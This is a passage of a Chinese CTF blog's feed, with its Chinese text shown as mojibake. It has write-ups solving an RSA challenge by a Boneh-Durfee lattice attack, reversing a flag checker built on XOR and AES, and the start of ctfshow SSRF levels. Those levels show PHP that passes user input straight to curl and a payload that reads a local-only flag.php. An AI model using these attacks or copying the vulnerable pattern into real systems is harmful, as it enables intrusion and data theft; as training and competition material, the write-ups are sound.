class="number">95987463597889741532025162535631829592517704738860431905943824498597890101136796870879646153634795544527837591685182170270252555997933421564167468816667980089869165228796395618775798781717091178143300536302805947806332962230499807469654672313206953750808878098101882367253566423367338396717229488061237787619</span></span><br><span class="line">        e = <span class="number">12761568528114005244342182138319275328501544878744699681091257281459893043102455333575012392492554249378138377894473691530001400901111860569849400611145049669197371290112261284014768486937294128410391332641648640840309135718123516725634190495261570498188176102281061084366456374907755950527213961595506707585</span></span><br><span class="line">        c = <span class="number">35154471719082941146017277238175991504655570882040897713927696748547265178059291385527810510087300325678561502592029686486144851647754163110759942860051150957340793828236482243293747881251009434747066136505663782280758979333019882382608002308773317613847702048959887017010151916544703971113441862351668075919</span></span><br><span class="line">        hint1 = <span class="number">1175980694459189065778</span></span><br><span class="line">        hint2 = <span class="number">632846170973644915854</span></span><br><span class="line"><span class="comment">#         print (&quot;pçœŸå®é«˜&quot;,s,&quot;æ¯”ç‰¹ï¼š&quot;, int(p/2^(512-s)))</span></span><br><span class="line"><span class="comment">#         print (&quot;qçœŸå®é«˜&quot;,s,&quot;æ¯”ç‰¹ï¼š&quot;, int(q/2^(512-s)))</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#         N = p*q;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment"># è§£å¯†æŒ‡æ•°dçš„æŒ‡æ•°( æœ€å¤§0.292)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        m = <span class="number">7</span>   <span class="comment"># æ ¼å¤§å°ï¼ˆè¶Šå¤§è¶Šå¥½/è¶Šæ…¢ï¼‰</span></span><br><span class="line">        t = <span class="built_in">round</span>(((<span class="number">1</span>-<span class="number">2</span>*delta) * m))  <span class="comment"># æ¥è‡ª Herrmann å’Œ May çš„ä¼˜åŒ–</span></span><br><span class="line">        X = floor(N^delta)  <span class="comment"># </span></span><br><span class="line">        Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>)/<span class="number">2</span>^s)    <span class="comment"># å¦‚æœ pã€ q å¤§å°ç›¸åŒï¼Œåˆ™æ­£ç¡®</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(hint1),<span class="built_in">int</span>(hint1)+<span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\n\n\n l=&#x27;</span>,l)</span><br><span class="line">            pM=l;</span><br><span class="line">            p0=pM*<span class="number">2</span>^(size-s)+<span class="number">2</span>^(size-s)-<span class="number">1</span>;</span><br><span class="line">            q0=N/p0;</span><br><span class="line">            qM=<span class="built_in">int</span>(q0/<span class="number">2</span>^(size-s))</span><br><span class="line">            A = N + <span class="number">1</span>-pM*<span class="number">2</span>^(size-s)-qM*<span class="number">2</span>^(size-s);</span><br><span class="line">        <span class="comment">#A = N+1</span></span><br><span class="line">            P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol = <span class="number">1</span> + x * (A + y)  <span class="comment">#æ„å»ºçš„æ–¹ç¨‹</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment"># Checking bounds</span></span><br><span class="line">            <span class="comment">#if debug:</span></span><br><span class="line">                <span class="comment">#print (&quot;=== æ ¸å¯¹æ•°æ® ===&quot;)</span></span><br><span class="line">                <span class="comment">#print (&quot;* delta:&quot;, delta)</span></span><br><span class="line">                <span class="comment">#print (&quot;* delta &lt; 0.292&quot;, delta &lt; 0.292)</span></span><br><span class="line">                <span class="comment">#print (&quot;* size of e:&quot;, ceil(log(e)/log(2)))  # eçš„bitæ•°</span></span><br><span class="line">                <span class="comment"># print (&quot;* size of N:&quot;, len(bin(N)))          # Nçš„bitæ•°</span></span><br><span class="line">                <span class="comment">#print (&quot;* size of N:&quot;, ceil(log(N)/log(2)))  # Nçš„bitæ•°</span></span><br><span class="line">                <span class="comment">#print (&quot;* m:&quot;, m, &quot;, t:&quot;, t)</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment"># boneh_durfee</span></span><br><span class="line">            <span class="keyword">if</span> debug:</span><br><span class="line">                <span class="comment">###print (&quot;=== running algorithm ===&quot;)</span></span><br><span class="line">                start_time = time.time()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="comment">#print (&quot;=== solution found ===&quot;)</span></span><br><span class="line">                <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;x:&quot;</span>, solx)</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;y:&quot;</span>, soly)</span><br><span class="line"> </span><br><span class="line">                d_sol = <span class="built_in">int</span>(pol(solx, soly) / e)</span><br><span class="line">                ss=ss+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;=== solution found ===&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;pçš„é«˜æ¯”ç‰¹ä¸ºï¼š&quot;</span>,l)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;qçš„é«˜æ¯”ç‰¹ä¸ºï¼š&quot;</span>,qM)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;d=&quot;</span>,d_sol) </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> debug:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time))</span><br><span class="line">            <span class="comment">#break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ss=&quot;</span>,ss)</span><br><span class="line">                            <span class="comment">#end=time.process_time</span></span><br><span class="line">        end=time.clock()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Running time: %s Seconds&#x27;</span>%(end-start))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    example()  </span><br></pre></td></tr></table></figure><p>â€‹å¾—åˆ°äº† dï¼Œç„¶åè§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">95987463597889741532025162535631829592517704738860431905943824498597890101136796870879646153634795544527837591685182170270252555997933421564167468816667980089869165228796395618775798781717091178143300536302805947806332962230499807469654672313206953750808878098101882367253566423367338396717229488061237787619</span></span><br><span class="line">e = <span class="number">12761568528114005244342182138319275328501544878744699681091257281459893043102455333575012392492554249378138377894473691530001400901111860569849400611145049669197371290112261284014768486937294128410391332641648640840309135718123516725634190495261570498188176102281061084366456374907755950527213961595506707585</span></span><br><span class="line">c = <span class="number">35154471719082941146017277238175991504655570882040897713927696748547265178059291385527810510087300325678561502592029686486144851647754163110759942860051150957340793828236482243293747881251009434747066136505663782280758979333019882382608002308773317613847702048959887017010151916544703971113441862351668075919</span></span><br><span class="line">d = <span class="number">994872951830622609173239108988480436496396666299008546372509127121113351371824434704770953</span></span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment">#wdflag&#123;a14a7fa0-4e7b-4624-ad0c-36c31dd8012e&#125;</span></span><br></pre></td></tr></table></figure><p>crypto02ï¼š</p><h1 id="reverse02"><a class="markdownIt-Anchor" href="#reverse02">#</a> reverse02ï¼š</h1><p>â€‹flag æœ‰å››ä¸ªéƒ¨åˆ†ï¼Œæ¯ä¸ªéƒ¨åˆ†éƒ½æœ‰ä¸€ä¸ªåŠ å¯†ã€‚</p><p>â€‹é¦–å…ˆç¬¬ä¸€éƒ¨åˆ†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the flag:&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( fgets(s, <span class="number">41</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) != <span class="number">40</span> || <span class="built_in">strncmp</span>(s, <span class="string">&quot;wdflag&#123;&quot;</span>, <span class="number">7uLL</span>) || v19[<span class="number">32</span>] != <span class="number">125</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>â€‹è¾“å…¥ flagï¼Œç„¶åæŠ€èƒ½é«˜å…´å¯¹æ¯”ï¼Œè¿›è¡Œæ¯”è¾ƒï¼Œ é¦–å…ˆæ˜¯é•¿åº¦ï¼Œä¹‹åå°±æ˜¯ flag çš„ä¸º wdflag {XXXXXX} æ ¼å¼ã€‚</p><p>â€‹ç¬¬äºŒéƒ¨åˆ†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(dest, v19, <span class="number">0x20</span>uLL);</span><br><span class="line">  v17[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">  s2[<span class="number">0</span>] = <span class="number">98</span>;</span><br><span class="line">  s2[<span class="number">1</span>] = <span class="number">-54</span>;</span><br><span class="line">  s2[<span class="number">2</span>] = <span class="number">-56</span>;</span><br><span class="line">  s2[<span class="number">3</span>] = <span class="number">108</span>;</span><br><span class="line">  s2[<span class="number">4</span>] = <span class="number">106</span>;</span><br><span class="line">  s2[<span class="number">5</span>] = <span class="number">104</span>;</span><br><span class="line">  s2[<span class="number">6</span>] = <span class="number">-54</span>;</span><br><span class="line">  s2[<span class="number">7</span>] = <span class="number">-56</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    s1[i] = <span class="number">2</span> * dest[i];</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(s1, s2, <span class="number">8uLL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><pre><code>çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªä¹˜ç§¯ï¼Œè§£å¯†å¾—åˆ°ç¬¬ä¸€éƒ¨åˆ†ï¼š</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># v11 = [0x6a,0xe,0x17,0x46,0x75,0xb,0x41,0x6]</span></span><br><span class="line">v11 = [<span class="number">98</span>,<span class="number">202</span>,<span class="number">200</span>,<span class="number">108</span>,<span class="number">106</span>,<span class="number">104</span>,<span class="number">202</span>,<span class="number">200</span>]</span><br><span class="line">a = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(v11)):</span><br><span class="line">    a += <span class="built_in">chr</span>(<span class="built_in">int</span>(v11[i]/<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#1ed654ed</span></span><br></pre></td></tr></table></figure><p>â€‹ç¬¬ä¸‰æ®µï¼Œå°±æ˜¯ä¸ªå¼‚æˆ–ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">v21 = <span class="string">&quot;XorrLord&quot;</span>;</span><br><span class="line">  v11[<span class="number">0</span>] = <span class="number">0x6A</span>;</span><br><span class="line">  v11[<span class="number">1</span>] = <span class="number">0xE</span>;</span><br><span class="line">  v11[<span class="number">2</span>] = <span class="number">0x17</span>;</span><br><span class="line">  v11[<span class="number">3</span>] = <span class="number">0x46</span>;</span><br><span class="line">  v11[<span class="number">4</span>] = <span class="number">0x75</span>;</span><br><span class="line">  v11[<span class="number">5</span>] = <span class="number">0xB</span>;</span><br><span class="line">  v11[<span class="number">6</span>] = <span class="number">0x41</span>;</span><br><span class="line">  v11[<span class="number">7</span>] = <span class="number">6</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">8</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">    v12[j - <span class="number">8</span>] = dest[j] ^ v21[j - <span class="number">8</span>];</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(v12, v11, <span class="number">8uLL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  base64_encode(&amp;v16, <span class="number">8LL</span>, v10);</span><br><span class="line">  v20 = <span class="string">&quot;Ajc2AYK2Bjg&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v10, <span class="string">&quot;Ajc2AYK2Bjg&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>â€‹è¾“å…¥çš„æ•°æ®éœ€è¦å’Œ XorrLord è¿›è¡Œå¼‚æˆ–æ“ä½œï¼Œä¹‹åå’Œ Ajc2AYKBjg è¿›è¡Œæ¯”è¾ƒï¼Œè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v11 = [<span class="number">0x6a</span>,<span class="number">0xe</span>,<span class="number">0x17</span>,<span class="number">0x46</span>,<span class="number">0x75</span>,<span class="number">0xb</span>,<span class="number">0x41</span>,<span class="number">0x6</span>]</span><br><span class="line">a = <span class="string">&quot;XorrLord&quot;</span></span><br><span class="line">b = <span class="string">&quot;&quot;</span></span><br><span class="line">lst = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    lst.append(<span class="built_in">ord</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a)):</span><br><span class="line">    lst[i] = <span class="built_in">chr</span>(v11[i] ^ <span class="built_in">ord</span>(a[i]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(b.join(lst))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#2ae49d3b</span></span><br></pre></td></tr></table></figure><p>â€‹æœ€åä¸€ä¸ªéƒ¨åˆ†å°±æ˜¯ AES åŠ å¯†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">qmemcpy(v9, <span class="string">&quot;AesMasterAesMast&quot;</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line">v8[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">v8[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(v8, v17, <span class="number">8uLL</span>);</span><br><span class="line"><span class="keyword">for</span> ( k = <span class="number">8</span>; k &lt;= <span class="number">15</span>; ++k )</span><br><span class="line">  *((_BYTE *)v8 + k) = <span class="number">8</span>;</span><br><span class="line">AES_set_encrypt_key(v9, <span class="number">128LL</span>, v6);</span><br><span class="line">AES_encrypt(v8, v7, v6);</span><br><span class="line">hex_to_string(v7, <span class="number">16LL</span>, v5);</span><br><span class="line">v4[<span class="number">0</span>] = <span class="number">-43</span>;</span><br><span class="line">v4[<span class="number">1</span>] = <span class="number">-28</span>;</span><br><span class="line">v4[<span class="number">2</span>] = <span class="number">-19</span>;</span><br><span class="line">v4[<span class="number">3</span>] = <span class="number">116</span>;</span><br><span class="line">v4[<span class="number">4</span>] = <span class="number">-78</span>;</span><br><span class="line">v4[<span class="number">5</span>] = <span class="number">-126</span>;</span><br><span class="line">v4[<span class="number">6</span>] = <span class="number">-127</span>;</span><br><span class="line">v4[<span class="number">7</span>] = <span class="number">35</span>;</span><br><span class="line">v4[<span class="number">8</span>] = <span class="number">79</span>;</span><br><span class="line">v4[<span class="number">9</span>] = <span class="number">-121</span>;</span><br><span class="line">v4[<span class="number">10</span>] = <span class="number">-24</span>;</span><br><span class="line">v4[<span class="number">11</span>] = <span class="number">58</span>;</span><br><span class="line">v4[<span class="number">12</span>] = <span class="number">31</span>;</span><br><span class="line">v4[<span class="number">13</span>] = <span class="number">-71</span>;</span><br><span class="line">v4[<span class="number">14</span>] = <span class="number">-51</span>;</span><br><span class="line">v4[<span class="number">15</span>] = <span class="number">121</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(v7, v4, <span class="number">0x10</span>uLL) )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>â€‹å°†æ•°æ®æå–å‡ºæ¥ä¹‹åä¸€æŠŠæ¢­äº†ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/6a1fad2f2b884df483b3ecdad35e1bf6.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwn02&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#pwn02&quot;&gt;#&lt;/a&gt; pwn02:&lt;/h1&gt;
&lt;p&gt;** ç¬¬ä¸€æ­¥ï¼š**checksec å‘ç° 32 ä½æ¶æ„ï¼Œå¼€äº† NX å’Œ ASLRã€‚&lt;/p&gt;
&lt;p&gt;&lt;img data-sr</summary>
      
    
    
    
    <category term="CTFerçš„æ¯”èµ›ä¹‹è·¯" scheme="http://blog.g01den.top/categories/Game/"/>
    
    
    <category term="Game" scheme="http://blog.g01den.top/tags/Game/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-ssrf</title>
    <link href="http://blog.g01den.top/posts/b856856d.html"/>
    <id>http://blog.g01den.top/posts/b856856d.html</id>
    <published>2024-09-26T11:09:50.000Z</published>
    <updated>2024-09-26T11:17:59.814Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web351"><a class="markdownIt-Anchor" href="#web351">#</a> web351ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">// å¼€å¯PHPæ–‡ä»¶  </span></span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="comment">// è¿™è¡Œä»£ç å°†PHPçš„é”™è¯¯æŠ¥å‘Šçº§åˆ«è®¾ç½®ä¸º0ï¼Œæ„å‘³ç€å…³é—­æ‰€æœ‰é”™è¯¯å’Œè­¦å‘Šçš„æ˜¾ç¤ºã€‚è¿™é€šå¸¸ç”¨äºç”Ÿäº§ç¯å¢ƒï¼Œä»¥é¿å…æš´éœ²æ•æ„Ÿä¿¡æ¯æˆ–é”™è¯¯ä¿¡æ¯ç»™ç”¨æˆ·ã€‚ç„¶è€Œï¼Œåœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œä¿æŒé”™è¯¯æŠ¥å‘Šå¼€å¯æ˜¯æ¨èçš„åšæ³•ï¼Œä»¥ä¾¿åŠæ—¶å‘ç°å’Œä¿®å¤é—®é¢˜ã€‚  </span></span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="comment">// `highlight_file()` å‡½æ•°å°†æŒ‡å®šçš„æ–‡ä»¶ï¼ˆè¿™é‡Œæ˜¯å½“å‰æ‰§è¡Œçš„æ–‡ä»¶ï¼Œç”± __FILE__ é­”æœ¯å¸¸é‡æä¾›ï¼‰çš„å†…å®¹ä½œä¸ºHTMLæ ¼å¼çš„é«˜äº®æºä»£ç è¾“å‡ºã€‚è¿™é€šå¸¸ç”¨äºå­¦ä¹ æˆ–å±•ç¤ºä»£ç ï¼Œä½†åœ¨ç”Ÿäº§ç¯å¢ƒä¸­å¯èƒ½ä¼šå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚  </span></span><br><span class="line">  </span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];  </span><br><span class="line"><span class="comment">// è¿™è¡Œä»£ç ä»å…¨å±€å˜é‡`$_POST`æ•°ç»„ä¸­è·å–é”®åä¸º&#x27;url&#x27;çš„å€¼ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™å˜é‡`$url`ã€‚è¿™æ„å‘³ç€ä»£ç æœŸæœ›é€šè¿‡POSTè¯·æ±‚æ¥æ”¶ä¸€ä¸ªåä¸º&#x27;url&#x27;çš„å‚æ•°ã€‚  </span></span><br><span class="line">  </span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);  </span><br><span class="line"><span class="comment">// ä½¿ç”¨`curl_init()`å‡½æ•°åˆå§‹åŒ–ä¸€ä¸ªæ–°çš„cURLä¼šè¯ï¼Œå¹¶å°†ä¹‹å‰è·å–çš„`$url`ä½œä¸ºå‚æ•°ä¼ é€’ç»™è¯¥å‡½æ•°ã€‚è¯¥å‡½æ•°è¿”å›ä¸€ä¸ªcURLä¼šè¯å¥æŸ„ï¼Œè¯¥å¥æŸ„ç”¨äºåç»­çš„æ‰€æœ‰cURLå‡½æ•°è°ƒç”¨ï¼Œå¹¶å­˜å‚¨åœ¨å˜é‡`$ch`ä¸­ã€‚  </span></span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);  </span><br><span class="line"><span class="comment">// é€šè¿‡`curl_setopt()`å‡½æ•°è®¾ç½®cURLä¼ è¾“é€‰é¡¹ã€‚è¿™é‡Œï¼Œ`CURLOPT_HEADER`é€‰é¡¹è¢«è®¾ç½®ä¸º0ï¼Œè¡¨ç¤ºåœ¨è·å–çš„å†…å®¹ä¸­ä¸åŒ…å«HTTPå¤´éƒ¨ã€‚è¿™é€šå¸¸æ˜¯å¯å–çš„ï¼Œå› ä¸ºå¤§å¤šæ•°æ—¶å€™æˆ‘ä»¬åªå…³å¿ƒHTTPå“åº”ä½“ï¼ˆå³ç½‘é¡µå†…å®¹ï¼‰ã€‚  </span></span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);  </span><br><span class="line"><span class="comment">// å†æ¬¡ä½¿ç”¨`curl_setopt()`å‡½æ•°è®¾ç½®cURLä¼ è¾“é€‰é¡¹ã€‚è¿™æ¬¡ï¼Œ`CURLOPT_RETURNTRANSFER`é€‰é¡¹è¢«è®¾ç½®ä¸º1ï¼Œè¡¨ç¤ºå°†cURLæ‰§è¡Œçš„ç»“æœä½œä¸ºå­—ç¬¦ä¸²è¿”å›ï¼Œè€Œä¸æ˜¯ç›´æ¥è¾“å‡ºã€‚è¿™ä½¿å¾—æˆ‘ä»¬å¯ä»¥å°†ç»“æœå­˜å‚¨åœ¨å˜é‡ä¸­ä¾›åç»­ä½¿ç”¨ã€‚  </span></span><br><span class="line">  </span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);  </span><br><span class="line"><span class="comment">// è°ƒç”¨`curl_exec()`å‡½æ•°æ‰§è¡ŒcURLä¼šè¯ã€‚å®ƒä¼šå‘é€ä¸€ä¸ªè¯·æ±‚åˆ°`curl_init()`å‡½æ•°æŒ‡å®šçš„URLï¼Œå¹¶è¿”å›æ‰§è¡Œç»“æœã€‚è¿™é‡Œï¼Œæ‰§è¡Œç»“æœè¢«å­˜å‚¨åœ¨å˜é‡`$result`ä¸­ã€‚å¦‚æœè¯·æ±‚å¤±è´¥ï¼Œ`curl_exec()`å°†è¿”å›`FALSE`ã€‚  </span></span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);  </span><br><span class="line"><span class="comment">// ä½¿ç”¨`curl_close()`å‡½æ•°å…³é—­cURLä¼šè¯ï¼Œå¹¶é‡Šæ”¾ä¸ä¹‹å…³è”çš„æ‰€æœ‰èµ„æºã€‚è¿™æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ï¼Œå¯ä»¥é¿å…èµ„æºæ³„éœ²ã€‚  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);  </span><br><span class="line"><span class="comment">// æœ€åï¼Œä½¿ç”¨`echo`è¯­å¥è¾“å‡ºå˜é‡`$result`çš„å†…å®¹ï¼Œå³cURLè¯·æ±‚çš„ç»“æœã€‚å¦‚æœè¯·æ±‚æˆåŠŸï¼Œè¿™å°†è¾“å‡ºè¯·æ±‚çš„ç½‘é¡µå†…å®¹ï¼›å¦‚æœè¯·æ±‚å¤±è´¥ï¼ˆå¹¶ä¸”æ²¡æœ‰è¿›è¡Œé”™è¯¯å¤„ç†ï¼‰ï¼Œåˆ™ä¸ä¼šè¾“å‡ºä»»ä½•å†…å®¹ï¼ˆé™¤éä¹‹å‰å…³é—­äº†é”™è¯¯æŠ¥å‘Šï¼‰ã€‚  </span></span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"><span class="comment">// ç»“æŸPHPæ–‡ä»¶</span></span><br></pre></td></tr></table></figure><p>â€‹æ‰«åå°æ‰«åˆ°äº† flag.phpï¼Œç”±æ­¤ï¼Œè®¿é—®ä¹‹åå‘ç°éæœ¬åœ°æ— æ³•è®¿é—®ï¼Œæ‰€ä»¥ç›´æ¥ ssrf è¯»æ–‡ä»¶ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><h1 id="web352"><a class="markdownIt-Anchor" href="#web352">#</a> web352ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ 